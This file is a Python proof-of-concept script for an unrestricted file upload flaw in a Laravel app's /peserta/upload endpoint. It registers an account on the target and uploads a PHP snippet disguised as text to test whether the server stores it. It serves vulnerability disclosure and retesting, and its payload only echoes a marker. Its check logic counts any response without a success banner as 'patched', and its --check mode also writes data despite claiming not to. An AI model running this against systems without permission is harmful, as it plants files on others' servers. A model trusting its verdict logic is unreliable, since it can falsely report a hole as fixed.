"""
PoC — Unvalidated File Upload
==============================
Issue type : Unrestricted File Upload
Product    : laravel-reza — /peserta/upload (TugasController::store)
Affected   : file field in POST /peserta/upload
CWE        : CWE-434 (Unrestricted Upload of File with Dangerous Type)
CVSS       : 8.1 (High)
Status     : FIXED in reviewed copy — non-PDF uploads now rejected (expect 422).

Researcher : Mas Admin (Hermes Agent)

Usage:
  python3 POC_file_upload.py --target <url> --check
  python3 POC_file_upload.py --target <url> --exploit

  --check    Probe non-PDF upload with a benign text payload (no mutation of value).
  --exploit  Demonstrate that an executable/text payload gets stored (mutates data).

Disclaimer: Authorized testing / education only. Unauthorized use is illegal.
"""

import argparse
import io
import random
import re
import sys
import time

try:
    import requests
except ImportError:
    sys.exit("[-] 'requests' required. Install with: pip install requests")


class Fmt:
    GREEN = "\033[92m"; RED = "\033[91m"; BLUE = "\033[94m"; RESET = "\033[0m"
    @staticmethod
    def info(t): print(f"{Fmt.BLUE}[*] {t}{Fmt.RESET}")
    @staticmethod
    def succ(t): print(f"{Fmt.GREEN}[+] {t}{Fmt.RESET}")
    @staticmethod
    def warn(t): print(f"{Fmt.RED}[!] {t}{Fmt.RESET}")
    @staticmethod
    def fail(t): print(f"{Fmt.RED}[-] {t}{Fmt.RESET}")


def register(s, base):
    r = s.get(base + "/register", timeout=15)
    csrf = re.search(r'name="_token" value="([^"]+)"', r.text)
    if not csrf:
        Fmt.fail("No CSRF token found"); sys.exit(2)
    csrf = csrf.group(1)
    email = f"poc_up_{int(time.time())}_{random.randint(100,999)}@test.com"
    r = s.post(base + "/register", data={
        "_token": csrf, "name": "pocup", "email": email,
        "password": "Password123!", "password_confirmation": "Password123!",
    }, allow_redirects=False, timeout=15)
    if r.status_code not in (302, 303, 200):
        Fmt.fail(f"Registration failed HTTP {r.status_code}"); sys.exit(2)
    Fmt.info(f"Registered: {email}")
    return s, csrf


def probe_upload(s, base, csrf, filename, content, mime):
    files = {"file": (filename, io.BytesIO(content), mime)}
    data = {"_token": csrf, "judul": "PoC", "minggu": "1"}
    # GET csrf for upload session
    r = s.get(base + "/peserta/upload", timeout=15)
    m = re.search(r'name="_token" value="([^"]+)"', r.text)
    if m:
        data["_token"] = m.group(1)
    r = s.post(base + "/peserta/upload", data=data, files=files, timeout=20)
    return r


def follow_and_inspect(s, base, r):
    """Follow redirects and determine stored-vs-rejected from page content.
    Laravel returns 302 (redirect back) both on success AND on validation error.
    On SUCCESS the view shows 'berhasil diupload' (flash success). Absence of that
    marker means the upload did NOT get stored (validation rejected it), because
    a successful store always redirects back with the success banner."""
    final = s.get(r.headers.get("location", base + "/peserta/upload"), timeout=15)
    txt = final.text
    if "berhasil diupload" in txt:
        return "accepted"
    # No success banner => file was not stored => validation blocked it.
    return "rejected"


def check(args):
    Fmt.info(f"Target : {args.target}")
    s = requests.Session()
    base = args.target.rstrip("/")
    s, csrf = register(s, base)

    Fmt.info("[--check] Uploading NON-PDF text/php payload...")
    r = probe_upload(s, base, csrf, "poc.txt",
                     b'<?php echo "POC"; ?>', "text/plain")
    verdict = follow_and_inspect(s, base, r)
    if verdict == "rejected":
        Fmt.succ("PATCHED: non-PDF upload rejected (validation mimes:pdf enforced).")
        return 3
    if verdict == "accepted":
        Fmt.warn("VULNERABLE: non-PDF upload accepted! Arbitrary file storage.")
        return 0
    Fmt.fail(f"Could not confirm verdict (HTTP {r.status_code}). Check manually.")
    return 2


def exploit(args):
    s = requests.Session()
    base = args.target.rstrip("/")
    s, csrf = register(s, base)
    r = probe_upload(s, base, csrf, "poc.txt",
                     b'<?php echo "POC"; ?>', "text/plain")
    verdict = follow_and_inspect(s, base, r)
    Fmt.info(f"Verdict: {verdict} (HTTP {r.status_code})")
    if verdict == "accepted":
        Fmt.warn("Payload stored. If served/findable, webshell risk is real.")
        return 0
    Fmt.info("Upload blocked — patched.")
    return 3


def main():
    p = argparse.ArgumentParser(description="Unvalidated file upload PoC")
    p.add_argument("--target", required=True)
    mode = p.add_mutually_exclusive_group(required=True)
    mode.add_argument("--check", action="store_true")
    mode.add_argument("--exploit", action="store_true")
    args = p.parse_args()
    sys.exit(check(args) if args.check else exploit(args))


main()